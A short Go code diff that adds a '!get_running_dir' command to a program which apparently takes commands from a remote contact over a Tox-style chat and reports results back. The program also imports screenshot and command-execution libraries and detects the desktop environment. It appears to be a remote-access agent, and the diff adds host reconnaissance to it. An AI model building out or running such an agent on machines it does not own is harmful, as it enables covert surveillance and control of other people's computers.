@@ -13,6 +13,7 @@ import (
     "os/exec"
     "github.com/vova616/screenshot"
     "image/png"
+    "path/filepath"
 )
 
 func init() {
@@ -198,6 +199,9 @@ func main() {
                     } else if string(message) == "!detect_de" {
                         de := detectDE()
                         t.FriendSendMessage(friendNumber, de)
+                    } else if string(message) == "!get_running_dir" {
+                        runningDir := getRunningDir()
+                        t.FriendSendMessage(friendNumber, runningDir)
                     }
                 fmt.Println(len([]rune(message)))
             }
@@ -533,4 +537,12 @@ func detectDE() (string) {
         return "There was an error trying to detect the DE"
     }
     return "Unknown DE"
+}
+
+func getRunningDir() (string) {
+    dir, err := filepath.Abs(filepath.Dir(os.Args[0]))
+    if err != nil {
+            log.Fatal(err)
+    }
+    return dir
 }
